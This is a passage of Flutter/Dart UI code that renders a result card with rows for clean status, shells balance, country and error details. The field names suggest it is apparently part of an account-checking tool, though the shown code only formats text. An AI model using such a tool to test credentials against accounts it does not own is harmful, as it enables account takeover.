          _row('🔒 Clean',  r.isClean             ? 'YES ✅'   : 'NO ❌', c),
          _row('📅 Status', r.detail, c),
        ],
        if (r.status==_S.noAccount && r.shell.isNotEmpty) ...[
          const SizedBox(height:8), const Divider(height:1, color:Colors.white12), const SizedBox(height:8),
          _row('💎 Shells',  r.shell,   c),
          _row('🌐 Country', r.country, c),
          _row('🔒 Clean',   r.isClean ? 'YES ✅' : 'NO ❌', c),
        ],
        if ((r.status==_S.bad||r.status==_S.error) && r.detail.isNotEmpty) ...[
          const SizedBox(height:4),
          Text(r.detail, style:TextStyle(color:sc.withOpacity(.7), fontSize:10)),
        ],
      ]),
    );
  }
  Widget _row(String l, String v, XissinColors c) => Padding(
    padding: const EdgeInsets.only(bottom:3),
    child: Row(children:[
      SizedBox(width:80, child:Text(l, style:TextStyle(color:c.textHint, fontSize:10))),
      Expanded(child:Text(v, style:TextStyle(color:c.textPrimary, fontSize:10,
          fontWeight:FontWeight.w600), maxLines:1, overflow:TextOverflow.ellipsis)),
    ]),
  );
}
